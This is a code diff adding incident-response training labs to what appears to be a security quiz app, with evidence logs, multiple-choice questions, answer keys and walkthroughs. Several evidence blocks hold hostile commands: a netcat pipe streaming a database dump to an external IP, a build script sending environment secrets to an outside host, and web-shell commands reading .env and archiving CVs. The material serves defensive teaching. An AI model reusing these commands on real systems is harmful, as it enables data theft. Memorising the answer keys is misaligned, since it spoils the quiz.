@@ -11197,4 +11197,1000 @@ DNS logs: queries to *.d3p-cfz.example from 4 runners`,
       },
     ],
   },
+  {
+    id: 'lab-112',
+    title: 'Investigating Cleared Event Logs',
+    domain: 1,
+    difficulty: 'Medium',
+    xpReward: 250,
+    briefing: 'A SIEM health alert shows a file server sent a log-cleared event and then nothing for an hour. The attacker clearly tried to cover their tracks. Work out what can still be recovered and what happened in the gap.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Read the clearing events',
+        evidence: r`Security log  Event 1102  2026-11-25 02:41:17
+The audit log was cleared.  Subject: CORP\adm_backup  Logon ID: 0x3E7A21
+System log    Event 104   2026-11-25 02:41:18
+The System log file was cleared.  User: CORP\adm_backup`,
+        question: 'What do these events give you even though logs were wiped?',
+        options: [
+          'The time of clearing and the account and logon session that did it',
+          'The full contents of the cleared logs',
+          'Nothing, the events are fake',
+          'The attacker\'s IP address directly',
+        ],
+        correctIndex: 0,
+        hint: 'Clearing a log writes its own event.',
+        walkthrough: 'Clearing the Security log generates 1102 and other logs generate 104. They name the account and logon ID, which you can trace back through DC logs and other sources.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Use forwarded copies',
+        evidence: r`SIEM search: host=FS-02 earliest=02:00 latest=02:41
+02:18  4624  LogonType 3  adm_backup  from 10.30.2.88
+02:22  5145  \\FS-02\Finance$  ReadData  (1,420 events)
+02:39  4688  wevtutil.exe cl Security
+02:39  4688  wevtutil.exe cl System`,
+        question: 'Why is the SIEM still useful?',
+        options: [
+          'The SIEM can undelete logs',
+          'Events were forwarded before clearing, so the SIEM holds the activity up to the moment logs were wiped',
+          'SIEMs store disk images',
+          'It is not useful',
+        ],
+        correctIndex: 1,
+        hint: 'Forwarding happened in near real time.',
+        walkthrough: 'Logs shipped before clearing survive. Here they show the attacker\'s logon source, mass reads from the Finance share, and the clearing commands.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Recover more from the host',
+        evidence: r`Options on the disk image
+- Carve EVTX chunks from unallocated space (e.g., EVTXtract-style carving)
+- Volume Shadow Copies containing older .evtx files
+- Other logs: Microsoft-Windows-SMBServer/Security, TaskScheduler, Defender (not cleared)`,
+        question: 'Why check other log channels?',
+        options: [
+          'They contain only performance data',
+          'Other channels are always empty',
+          'Attackers often clear only Security and System, leaving other channels with useful evidence',
+          'Clearing deletes all channels',
+        ],
+        correctIndex: 2,
+        hint: 'Which logs did the events say were cleared?',
+        walkthrough: 'Only two channels were cleared. Operational logs for SMB, Task Scheduler, Defender, and PowerShell may still hold relevant entries. Shadow copies and carving can also recover older records.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Trace the account',
+        evidence: r`DC logs for adm_backup (02:00-03:00)
+02:16  4768 TGT  from 10.30.2.88 (WKS-HR-14)
+02:16  4769 TGS cifs/FS-02
+adm_backup password last set: 2024-06-02; member of Backup Operators`,
+        question: 'What does Backup Operators membership mean for the attacker?',
+        options: [
+          'It cannot access file shares',
+          'It only allows running backups at night',
+          'It allows reading any file regardless of permissions and logging on to servers, making it a high-value account',
+          'It is a guest group',
+        ],
+        correctIndex: 2,
+        hint: 'Backup Operators can bypass file ACLs for backup.',
+        walkthrough: 'Backup Operators hold backup and restore privileges that bypass NTFS permissions, and can log on to DCs. Treat the account as compromised, reset it, and investigate WKS-HR-14.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Prevent and detect',
+        evidence: r`Controls
+- Alert on 1102/104 and on wevtutil cl / Clear-EventLog
+- Forward all relevant channels, not just Security
+- Remove standing members from Backup Operators; use a managed backup service account`,
+        question: 'Why alert on clearing even though logs are forwarded?',
+        options: [
+          'Because forwarding stops working after clearing',
+          'To recover the logs',
+          'To save disk space',
+          'Clearing is almost always malicious outside of planned maintenance, so it is a high-confidence signal of active intrusion',
+        ],
+        correctIndex: 3,
+        hint: 'Rare event, high value.',
+        walkthrough: 'Log clearing by an interactive account is rare and should page the on-call analyst. Combined with full-channel forwarding and fewer privileged accounts, it greatly reduces the value of clearing.',
+      },
+    ],
+  },
+  {
+    id: 'lab-113',
+    title: 'Pivoting on Attacker Infrastructure with Threat Intel',
+    domain: 1,
+    difficulty: 'Medium',
+    xpReward: 250,
+    briefing: 'You have one confirmed C2 domain from a phishing incident. Leadership asks whether this is a targeted campaign and whether other infrastructure might hit you next. Use passive DNS, certificates, and WHOIS to expand your indicators responsibly.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Start from the known domain',
+        evidence: r`Seed: docs-sharepoint-view.example
+Resolves: 203.0.113.45  (first seen 2026-11-01)
+Passive DNS on 203.0.113.45:
+  docs-sharepoint-view.example
+  onedrive-secure-files.example
+  payroll-update-portal.example
+  mail.small-bakery.example (since 2023)`,
+        question: 'How should you treat the domains sharing the IP?',
+        options: [
+          'All are safe',
+          'All are malicious',
+          'As leads that need more evidence, since shared hosting means unrelated sites can share an IP',
+          'Block the entire IP range of the provider',
+        ],
+        correctIndex: 2,
+        hint: 'Shared IPs are common.',
+        walkthrough: 'Passive DNS shows names that resolved to the same IP. Lookalike Microsoft-themed names created recently are strong leads. A bakery mail server seen for years is likely unrelated shared hosting.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Use certificate transparency',
+        evidence: r`crt.sh search for "%sharepoint-view%"
+Issued 2026-11-01  CN=docs-sharepoint-view.example
+Issued 2026-11-01  CN=hr-sharepoint-view.example   (not yet resolving)
+Issued 2026-11-01  CN=it-sharepoint-view.example   (not yet resolving)`,
+        question: 'Why are the non-resolving names valuable?',
+        options: [
+          'They are irrelevant',
+          'They are expired',
+          'They prove the attacker\'s identity',
+          'They may be infrastructure prepared for future phishing waves, so you can block them before they are used',
+        ],
+        correctIndex: 3,
+        hint: 'Certificates are often issued before campaigns launch.',
+        walkthrough: 'CT logs record every public certificate. Names issued at the same time with the same pattern are likely staged infrastructure. Proactive blocking reduces the next wave\'s success.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Check WHOIS patterns',
+        evidence: r`docs-sharepoint-view.example   Registrar: CheapReg   Created: 2026-10-31   NS: ns1.fastdns.example
+onedrive-secure-files.example  Registrar: CheapReg   Created: 2026-10-31   NS: ns1.fastdns.example
+payroll-update-portal.example  Registrar: CheapReg   Created: 2026-10-31   NS: ns1.fastdns.example`,
+        question: 'What links these domains?',
+        options: [
+          'Same registrar, creation date, and name servers, which together suggest one actor registered them',
+          'They all use DNS',
+          'They have similar lengths',
+          'Nothing',
+        ],
+        correctIndex: 0,
+        hint: 'Several matching attributes at once.',
+        walkthrough: 'Shared registration details are good clustering signals. Privacy services hide registrant names, but registration timing, registrar, and name servers still connect domains.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Check your own exposure',
+        evidence: r`Proxy logs (30 days)
+onedrive-secure-files.example  hits: 3 users
+payroll-update-portal.example  hits: 0
+hr-sharepoint-view.example     hits: 0`,
+        question: 'What is the next action for the 3 users?',
+        options: [
+          'Wait for the domain to be confirmed malicious by a vendor',
+          'Nothing, the domain was not the original seed',
+          'Block the users\' internet',
+          'Investigate them as possible phishing victims, check for credential submission and follow-on sign-ins',
+        ],
+        correctIndex: 3,
+        hint: 'Expanded indicators reveal more victims.',
+        walkthrough: 'Pivoting found a related domain that some users visited. Treat it like the original incident: check for credential entry, MFA prompts, and unusual sign-ins.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Share and act',
+        evidence: r`Indicator package: 5 domains, 1 IP, confidence levels
+Options: internal blocklist, share with ISAC, report to registrar for takedown`,
+        question: 'Why include confidence levels when sharing?',
+        options: [
+          'Confidence levels are required by DNS',
+          'To make the list longer',
+          'So recipients can decide how to act, such as blocking high-confidence items and monitoring lower-confidence ones, avoiding unnecessary disruption',
+          'To hide the source',
+        ],
+        correctIndex: 2,
+        hint: 'Not every indicator is equally certain.',
+        walkthrough: 'Shared infrastructure can cause false positives, like the bakery domain. Labeling confidence helps partners use the intel safely. Takedown requests further disrupt the campaign.',
+      },
+    ],
+  },
+  {
+    id: 'lab-114',
+    title: 'Reading Scan Types From Firewall Logs',
+    domain: 2,
+    difficulty: 'Easy',
+    xpReward: 250,
+    briefing: 'The perimeter firewall logged a burst of denied packets from one external IP across many ports. The NOC wants to know what kind of scan it was, what the scanner learned, and whether to worry.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Look at TCP flags',
+        evidence: r`Firewall log (198.51.100.25 -> 203.0.113.10)
+proto=TCP flags=S    dport=21  action=deny
+proto=TCP flags=S    dport=22  action=allow -> RST? no; SYN/ACK returned
+proto=TCP flags=S    dport=23  action=deny
+proto=TCP flags=R    dport=22  (sent by scanner after SYN/ACK)`,
+        question: 'What scan type is this?',
+        options: [
+          'A full connect scan',
+          'A TCP SYN (half-open) scan, which sends SYN and resets after a SYN/ACK without completing the handshake',
+          'A UDP scan',
+          'A ping sweep',
+        ],
+        correctIndex: 1,
+        hint: 'Did the scanner finish the handshake?',
+        walkthrough: 'A SYN scan sends SYN, notes a SYN/ACK as open, then sends RST. It is fast and the default for privileged Nmap scans. Port 22 responded, so it is open.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Recognize another pattern',
+        evidence: r`Later from same source
+proto=TCP flags=FPU dport=1-1024
+proto=TCP flags=none dport=1-1024`,
+        question: 'What are these packets?',
+        options: [
+          'Xmas (FIN, PSH, URG) and NULL scans, which try to probe ports or slip past simple filters using unusual flag combinations',
+          'Normal web traffic',
+          'A TCP keepalive',
+          'A DNS lookup',
+        ],
+        correctIndex: 0,
+        hint: 'Legitimate stacks do not send these combinations.',
+        walkthrough: 'Xmas and NULL scans rely on RFC behavior where closed ports reply with RST. They are noisy to modern IDS and indicate deliberate scanning. Any such packets are worth blocking and logging.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Check what was learned',
+        evidence: r`Open responses from 203.0.113.10
+22/tcp   SYN/ACK
+443/tcp  SYN/ACK
+8443/tcp SYN/ACK  (management console)`,
+        question: 'Which open port is the most concerning?',
+        options: [
+          '443, the website',
+          '8443, a management console exposed to the internet',
+          '22, if key-only SSH with no passwords',
+          'None of them',
+        ],
+        correctIndex: 1,
+        hint: 'Admin interfaces should not face the internet.',
+        walkthrough: 'Web and well-hardened SSH may be intended. A management console on 8443 is a high-value target. Restrict it to VPN or admin networks.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Check for follow-up',
+        evidence: r`Next 24h from 198.51.100.25
+443: GET /  ...  (banner grab)
+8443: POST /api/login  x 380 (failed)`,
+        question: 'What does the follow-up show?',
+        options: [
+          'The scanner moved from discovery to password guessing on the management console',
+          'The attacker gave up',
+          'It is a search engine',
+          'The console was patched',
+        ],
+        correctIndex: 0,
+        hint: 'Scanning is often step one.',
+        walkthrough: 'Reconnaissance usually precedes targeted attacks. Failed logins on the console show a direct attempt. Block the source, restrict the port, and check the console for successful logins.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Respond proportionately',
+        evidence: r`Options
+- Block the IP (short term)
+- Remove 8443 from internet exposure (long term)
+- Alert on > 100 distinct ports from one source in 1 minute`,
+        question: 'Why is blocking the IP alone not enough?',
+        options: [
+          'IPs never change',
+          'Blocking does not work on firewalls',
+          'Attackers can switch IPs easily, so removing the exposure is what actually reduces risk',
+          'The firewall cannot log blocks',
+        ],
+        correctIndex: 2,
+        hint: 'Fix the exposure, not just the symptom.',
+        walkthrough: 'Internet-wide scanning is constant. Blocking one source buys little time. The durable fix is not exposing admin interfaces, plus alerts for scans that turn into targeted attacks.',
+      },
+    ],
+  },
+  {
+    id: 'lab-115',
+    title: 'Raw TCP Exfiltration From a Database Server',
+    domain: 2,
+    difficulty: 'Medium',
+    xpReward: 250,
+    briefing: 'A NetFlow alert shows a database server sending 3 GB to an external IP on port 4444, which is not an approved service. There is no TLS and no application protocol detected. Investigate the transfer.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Read the flow',
+        evidence: r`NetFlow
+src 10.8.1.20 (DB-ORA02) -> 203.0.113.66:4444  proto TCP
+bytes 3.1 GB   packets 2.2M   duration 38 min   started 03:12`,
+        question: 'Why is this flow suspicious on its own?',
+        options: [
+          'Flows are always benign',
+          'Port 4444 is a standard database port',
+          '3 GB is normal for backups to the internet',
+          'A database server rarely starts outbound connections to the internet, and a high-numbered port with no known protocol is unusual',
+        ],
+        correctIndex: 3,
+        hint: 'Who should talk to databases?',
+        walkthrough: 'Databases normally receive connections from app servers. A large outbound session to the internet on an unapproved port is a strong exfiltration signal.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Inspect the payload',
+        evidence: r`Zeek conn.log: service = (none)   history = ShADadFf
+Packet sample (first bytes of stream): 1f 8b 08 00 ...`,
+        question: 'What do the first bytes 1f 8b indicate?',
+        options: [
+          'DNS query',
+          'An HTTP request',
+          'TLS handshake',
+          'The stream is gzip-compressed data, suggesting a compressed archive or dump was sent raw over TCP',
+        ],
+        correctIndex: 3,
+        hint: 'Magic bytes identify formats.',
+        walkthrough: '1f 8b is the gzip signature. Sending a compressed file over a plain TCP socket is what tools like netcat do: no protocol, just bytes.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Find the command',
+        evidence: r`auditd on DB-ORA02 (execve)
+03:11:58 oracle: expdp ... dumpfile=full.dmp
+03:12:02 oracle: sh -c "gzip -c /u01/dump/full.dmp | nc 203.0.113.66 4444"`,
+        question: 'What happened?',
+        options: [
+          'A full database export was created and streamed compressed to the external host using netcat',
+          'A scheduled backup to the vendor',
+          'A failed export',
+          'An Oracle patch download',
+        ],
+        correctIndex: 0,
+        hint: 'Follow the pipe.',
+        walkthrough: 'The audit log shows a data pump export followed by gzip piped into nc. The whole database left the network in 38 minutes.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Trace how the attacker got there',
+        evidence: r`auth: 03:05 oracle login via SSH from 10.8.4.9 (APP-07) using key
+APP-07: web shell in /var/www/html/uploads/x.jsp (found by EDR)`,
+        question: 'What does this establish?',
+        options: [
+          'The attacker compromised a web server, then used an SSH key to reach the database server as oracle',
+          'The DBA ran the commands',
+          'The database was attacked directly from the internet',
+          'There was no compromise',
+        ],
+        correctIndex: 0,
+        hint: 'Work backward from the session.',
+        walkthrough: 'The path is web shell on APP-07, then an SSH key trusted by DB-ORA02. That key, and any others on APP-07, must be revoked.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Close the gaps',
+        evidence: r`Controls
+- Default-deny egress for database subnet
+- Remove netcat and similar tools from servers that do not need them
+- Restrict SSH between app and DB tiers; no shared keys
+- Alert on outbound flows > 500 MB from server subnets`,
+        question: 'Which control would have stopped the transfer even after compromise?',
+        options: [
+          'Default-deny egress from the database subnet',
+          'Removing netcat',
+          'The volume alert',
+          'Rotating keys',
+        ],
+        correctIndex: 0,
+        hint: 'Attackers can bring their own tools.',
+        walkthrough: 'Removing netcat helps but attackers can use other tools. Blocking outbound internet from database servers prevents direct exfiltration regardless of tool. Alerts and tier isolation add depth.',
+      },
+    ],
+  },
+  {
+    id: 'lab-116',
+    title: 'Compromise of the Entra Connect Sync Server',
+    domain: 3,
+    difficulty: 'Hard',
+    xpReward: 250,
+    briefing: 'The server that synchronizes on-prem Active Directory to Entra ID (Entra Connect) shows signs of compromise. Soon after, a cloud-only Global Administrator\'s password changed. Understand why this server is so powerful and recover.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Understand the server\'s role',
+        evidence: r`Entra Connect on SYNC-01
+Sync account in AD: MSOL_4f2a... (Replicate Directory Changes, password hash sync)
+Sync account in Entra: Sync_SYNC-01_... (Directory Synchronization Accounts role)
+Features: Password Hash Sync, Password Writeback`,
+        question: 'Why is this server considered Tier 0?',
+        options: [
+          'It is only a file server',
+          'It hosts email',
+          'It runs the company website',
+          'Its AD account can read password hashes from the domain and its cloud account can change synced identities, so control of it affects both AD and Entra',
+        ],
+        correctIndex: 3,
+        hint: 'Look at the rights of both accounts.',
+        walkthrough: 'The MSOL account has replication rights, close to a DCSync capability. The cloud sync account can modify identities. Compromise of this server bridges to both directories.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Read the cloud audit log',
+        evidence: r`Entra audit log
+2026-11-26 01:20  Actor: Sync_SYNC-01_...   Activity: Reset password   Target: ga-breakglass@corp.onmicrosoft.com
+2026-11-26 01:22  Sign-in: ga-breakglass  IP 198.51.100.140  Success`,
+        question: 'Why is the sync account resetting a cloud-only admin\'s password alarming?',
+        options: [
+          'Break-glass accounts rotate automatically',
+          'It is routine',
+          'It is password writeback working normally',
+          'The sync account should only manage synced users; resetting a cloud-only Global Admin shows abuse of its permissions to take over the tenant',
+        ],
+        correctIndex: 3,
+        hint: 'Which identities should sync touch?',
+        walkthrough: 'Historically, the sync role had broad permissions that attackers abused. Microsoft has restricted this, but where possible it remains a takeover path. Any sync account action on a cloud-only admin is suspicious.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Contain in the cloud',
+        evidence: r`Plan
+- Revoke sessions and reset ga-breakglass; review all admin role changes since 01:20
+- Disable the Sync_ account temporarily
+- Check for new app registrations, credentials on service principals, and federation changes`,
+        question: 'Why check service principals and federation settings?',
+        options: [
+          'Attackers with Global Admin often add credentials to apps or new federated domains to keep access even after passwords are reset',
+          'To speed up sync',
+          'Because users requested it',
+          'It is not needed',
+        ],
+        correctIndex: 0,
+        hint: 'Persistence in the tenant.',
+        walkthrough: 'New secrets on high-privilege apps or a rogue federated domain let attackers mint tokens without passwords. These must be found and removed.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Contain on-prem',
+        evidence: r`SYNC-01 forensic findings
+- Local admin added: helpdesk_temp (11-25 22:40)
+- Tooling used to extract sync account credentials from local config database
+- RDP from 10.12.5.30`,
+        question: 'What must be done with the MSOL AD account?',
+        options: [
+          'Nothing, it is a service account',
+          'Delete it permanently without replacing',
+          'Reset its password and review AD replication requests from non-DC sources, since its credentials were extracted',
+          'Add it to Domain Admins',
+        ],
+        correctIndex: 2,
+        hint: 'It has replication rights in AD.',
+        walkthrough: 'With the MSOL credentials, an attacker can replicate password hashes from AD. Reset it (Entra Connect can be reconfigured with a new account), look for DCSync from unusual hosts, and rebuild SYNC-01.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Harden',
+        evidence: r`Hardening
+- Treat SYNC-01 as Tier 0: no logons from lower tiers, dedicated admin accounts
+- Use the latest Entra Connect version with application-based auth for the sync identity
+- Break-glass accounts excluded from risky sync scope; alert on any sign-in
+- Consider cloud sync agent with least privilege`,
+        question: 'Why alert on any break-glass sign-in?',
+        options: [
+          'To track license usage',
+          'They sign in hourly',
+          'Break-glass accounts should almost never be used, so any sign-in is a strong signal of an emergency or compromise',
+          'They cannot sign in',
+        ],
+        correctIndex: 2,
+        hint: 'Rare by design.',
+        walkthrough: 'Emergency accounts are for outages only. Monitoring them closely, protecting them with phishing-resistant MFA, and keeping them out of sync paths makes takeover visible fast.',
+      },
+    ],
+  },
+  {
+    id: 'lab-117',
+    title: 'CI Secrets Exposed Through Pull Request Workflows',
+    domain: 3,
+    difficulty: 'Medium',
+    xpReward: 250,
+    briefing: 'A public open-source repo owned by your company had its cloud deploy credentials used by an outsider. The only recent activity was a pull request from a new contributor. Investigate how a PR from a fork reached production secrets.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Read the workflow',
+        evidence: r`.github/workflows/preview.yml
+on: pull_request_target
+jobs:
+  build:
+    steps:
+      - uses: actions/checkout@v4
+        with: { ref: github.event.pull_request.head.sha }
+      - run: npm ci && npm run build
+    env: { DEPLOY_KEY: secrets.PREVIEW_DEPLOY_KEY }`,
+        question: 'Why is this workflow dangerous?',
+        options: [
+          'It uses an old checkout version',
+          'It only runs on main',
+          'Secrets are never available to workflows',
+          'pull_request_target runs with repository secrets, and it checks out and builds the untrusted fork\'s code, so the fork\'s scripts run with access to the secret',
+        ],
+        correctIndex: 3,
+        hint: 'Which code runs, and with what permissions?',
+        walkthrough: 'pull_request_target runs in the context of the base repository with secrets and a write token. Checking out the PR head and running its build executes attacker code in that privileged context.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Find the malicious change',
+        evidence: r`PR #482 from fork newdev123/project (opened 2026-11-26 09:10)
+package.json:
+- "build": "vite build"
++ "build": "vite build && node scripts/telemetry.js"
+scripts/telemetry.js: sends process.env to https://hooks.ci-metrics.example`,
+        question: 'How did the secret leave?',
+        options: [
+          'GitHub leaked it',
+          'The PR changed the build script to send environment variables, including the secret, to an external server when the workflow ran',
+          'The secret was in the README',
+          'A maintainer copied it',
+        ],
+        correctIndex: 1,
+        hint: 'The build step ran attacker-controlled scripts.',
+        walkthrough: 'Changing package.json scripts is enough. npm run build executes whatever the PR defines, inside the privileged workflow.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Contain',
+        evidence: r`Exposed secrets: PREVIEW_DEPLOY_KEY (cloud deploy role), GITHUB_TOKEN (write, expired at job end)
+Cloud logs: deploy role used from 203.0.113.17 at 09:24 to create a new access key`,
+        question: 'What is the containment priority?',
+        options: [
+          'Delete the fork',
+          'Close the PR only',
+          'Rotate the GITHUB_TOKEN',
+          'Revoke the deploy key and the access key the attacker created, check for other changes made with that role, and disable the workflow',
+        ],
+        correctIndex: 3,
+        hint: 'The attacker created persistence.',
+        walkthrough: 'The job token expires, but the cloud credential does not. The new access key is attacker persistence and must be removed. Disable the workflow until fixed.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Fix the workflow',
+        evidence: r`Options
+A) Use on: pull_request for building fork code (no secrets), and a separate trusted workflow for deploy
+B) Keep pull_request_target but add "if: contains(labels, 'safe')"
+C) Require approval for workflows from first-time contributors`,
+        question: 'Which option is the safest design?',
+        options: [
+          'Keep it as is',
+          'B alone',
+          'A, build untrusted code without secrets and deploy only from trusted code, with C as an additional control',
+          'Make the repository private',
+        ],
+        correctIndex: 2,
+        hint: 'Separate untrusted build from privileged deploy.',
+        walkthrough: 'pull_request workflows from forks receive no secrets. Previews can be built there and deployed by a separate workflow that only uses built artifacts after review. Label gates can be misapplied.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Strengthen cloud trust',
+        evidence: r`Replace PREVIEW_DEPLOY_KEY with OIDC:
+Trust policy condition: token.actions.githubusercontent.com:sub = "repo:corp/project:ref:refs/heads/main"`,
+        question: 'How does this condition help?',
+        options: [
+          'It encrypts the build',
+          'Only workflows running on the main branch of the repo can assume the role, so a PR workflow cannot get cloud credentials',
+          'It disables forks',
+          'It removes the need for reviews',
+        ],
+        correctIndex: 1,
+        hint: 'Bind cloud access to a trusted ref.',
+        walkthrough: 'OIDC with a strict subject condition ensures credentials are issued only to trusted workflows. There is no long-lived secret for a malicious PR to steal.',
+      },
+    ],
+  },
+  {
+    id: 'lab-118',
+    title: 'Bypassing an Upload Filter to Plant a Web Shell',
+    domain: 4,
+    difficulty: 'Medium',
+    xpReward: 250,
+    briefing: 'A recruitment portal lets candidates upload CVs. The developers say only PDF and DOCX files are allowed. Yet EDR on the web server caught a shell spawned from the PHP process. Find out how the filter was bypassed.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Look at the upload',
+        evidence: r`access.log
+POST /careers/upload  200   filename="cv.pdf.php"  Content-Type: application/pdf
+GET  /careers/files/cv.pdf.php?q=whoami  200`,
+        question: 'How did the attacker get a PHP file past the filter?',
+        options: [
+          'They used FTP',
+          'The file was a real PDF',
+          'The filter was disabled',
+          'The filter checked the declared Content-Type and that the name contained .pdf, but the final extension was .php',
+        ],
+        correctIndex: 3,
+        hint: 'Which part of the name decides how the server runs it?',
+        walkthrough: 'Content-Type is supplied by the client and can be anything. A name check that looks for .pdf anywhere misses the trailing .php that the web server uses to decide execution.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Read the validation code',
+        evidence: r`if (strpos($name, '.pdf') !== false || strpos($name, '.docx') !== false) {
+    if ($_FILES['cv']['type'] == 'application/pdf' || ...) {
+        move_uploaded_file($tmp, "files/" . $name);`,
+        question: 'What are the flaws in this validation?',
+        options: [
+          'It uses substring matching on the name, trusts the client-supplied MIME type, and keeps the user\'s filename in a web-accessible folder',
+          'It uses PHP',
+          'It moves the file',
+          'It checks two types',
+        ],
+        correctIndex: 0,
+        hint: 'Count the trust mistakes.',
+        walkthrough: 'Validation should check the real final extension against an allowlist, inspect file content, rename files server-side, and store them where they cannot be executed.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Assess the compromise',
+        evidence: r`EDR
+php-fpm -> sh -c whoami
+php-fpm -> sh -c "cat /var/www/careers/.env"
+php-fpm -> sh -c "tar czf /tmp/cvs.tgz /var/www/careers/files/*.pdf"`,
+        question: 'What did the attacker access?',
+        options: [
+          'Nothing important',
+          'Only the whoami output',
+          'Application secrets from .env and an archive of all uploaded candidate CVs',
+          'The source code repository',
+        ],
+        correctIndex: 2,
+        hint: 'CVs contain personal data.',
+        walkthrough: 'The .env file usually holds database and API credentials. Archiving every CV is a personal data breach affecting all applicants.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Contain',
+        evidence: r`Actions
+- Remove the shell and any other executable files in /files
+- Rotate secrets from .env
+- Preserve logs and determine whether /tmp/cvs.tgz was downloaded
+- Disable uploads until fixed`,
+        question: 'Why check whether the archive was downloaded?',
+        options: [
+          'It determines whether the CVs actually left the server, which affects breach notification',
+          'To restore the archive',
+          'Archives are always downloaded',
+          'It does not matter',
+        ],
+        correctIndex: 0,
+        hint: 'Created is not the same as exfiltrated.',
+        walkthrough: 'Web logs or network data showing a GET for the archive, or outbound transfer of similar size, confirm exfiltration. Either way, treat secrets as exposed.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Fix the upload feature',
+        evidence: r`Design
+- Allowlist on final extension + magic byte check
+- Generate random file names; store outside web root or in object storage
+- Serve via download handler with Content-Disposition: attachment
+- Disable script execution in upload directory`,
+        question: 'Which measure prevents execution even if a bad file slips through?',
+        options: [
+          'Magic byte checks',
+          'Storing files outside the web root (or disabling script execution there) so the server never runs them',
+          'Random names alone',
+          'Content-Disposition headers',
+        ],
+        correctIndex: 1,
+        hint: 'Defense in depth: assume a check fails.',
+        walkthrough: 'Even perfect validation can miss something. If uploads are never executed, a planted script is harmless. Combine it with strict validation and renaming.',
+      },
+    ],
+  },
+  {
+    id: 'lab-119',
+    title: 'Mass Assignment Grants Admin Rights',
+    domain: 4,
+    difficulty: 'Easy',
+    xpReward: 250,
+    briefing: 'A SaaS app\'s audit log shows a regular user became an organization admin without any admin approving it. The user only used the profile update page. Investigate the API.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Compare requests',
+        evidence: r`Normal profile update (from UI)
+PATCH /api/users/me  {"displayName":"Sam","timezone":"Europe/Paris"}
+Suspicious request
+PATCH /api/users/me  {"displayName":"Sam","role":"org_admin","orgId":"o-1001"}`,
+        question: 'What did the user add?',
+        options: [
+          'Extra fields for role and organization that the UI never sends',
+          'A different user ID',
+          'A SQL payload',
+          'A larger display name',
+        ],
+        correctIndex: 0,
+        hint: 'Compare the JSON keys.',
+        walkthrough: 'Mass assignment happens when the server copies all incoming fields onto the model. Adding fields like role lets a user change attributes they should not control.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Find the code',
+        evidence: r`router.patch('/users/me', async (req, res) => {
+  const user = await User.findById(req.user.id);
+  Object.assign(user, req.body);
+  await user.save();
+});`,
+        question: 'Why is Object.assign(user, req.body) dangerous?',
+        options: [
+          'It is slow',
+          'It writes every field from the request into the user record, including protected ones like role and orgId',
+          'It removes fields',
+          'It only works for strings',
+        ],
+        correctIndex: 1,
+        hint: 'Who decides which fields can change?',
+        walkthrough: 'Binding request bodies directly to models lets clients choose what to set. Only explicitly allowed fields should be copied.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Scope the abuse',
+        evidence: r`DB audit: role changes not performed through /api/admin/roles (90 days)
+user  old_role  new_role   via
+u-551 member    org_admin  /api/users/me
+u-873 member    org_admin  /api/users/me
+u-873 orgId     o-1001 -> o-2044 (another customer)`,
+        question: 'What makes u-873\'s case worse?',
+        options: [
+          'They changed their name',
+          'They also changed their orgId to join another customer\'s organization as admin, a cross-tenant breach',
+          'They used a different browser',
+          'Nothing',
+        ],
+        correctIndex: 1,
+        hint: 'Look at the orgId change.',
+        walkthrough: 'Changing orgId moves the user into another tenant with admin rights, exposing a different customer\'s data. That is a reportable cross-tenant incident.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Contain',
+        evidence: r`Actions
+- Revert role and orgId for u-551 and u-873
+- Review what u-873 accessed in org o-2044; notify that customer
+- Hotfix: ignore role/orgId in /users/me`,
+        question: 'Why notify the other customer?',
+        options: [
+          'It is not required',
+          'To sell them more licenses',
+          'Their data may have been accessed by an outside party, and contracts and privacy laws often require prompt notification',
+          'To ask them to fix the bug',
+        ],
+        correctIndex: 2,
+        hint: 'Their data, their right to know.',
+        walkthrough: 'Cross-tenant access affects another customer\'s confidentiality. Review access logs for u-873 in o-2044 to provide accurate details.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Fix the class of bug',
+        evidence: r`Fix options
+- Allowlist: const { displayName, timezone } = req.body
+- Schema validation rejecting unknown fields
+- Separate admin endpoint with authorization for role changes
+- Tests that send protected fields and expect 400`,
+        question: 'Why add tests that send protected fields?',
+        options: [
+          'To slow down CI',
+          'They catch regressions where a future change reintroduces mass assignment',
+          'To test UI layout',
+          'They replace code review',
+        ],
+        correctIndex: 1,
+        hint: 'Prevent the bug from coming back.',
+        walkthrough: 'Allowlisting fixes this endpoint. Schema validation helps everywhere. Negative tests make sure later refactors do not quietly reopen the hole.',
+      },
+    ],
+  },
+  {
+    id: 'lab-120',
+    title: 'COM Hijacking for Stealthy Persistence',
+    domain: 5,
+    difficulty: 'Medium',
+    xpReward: 250,
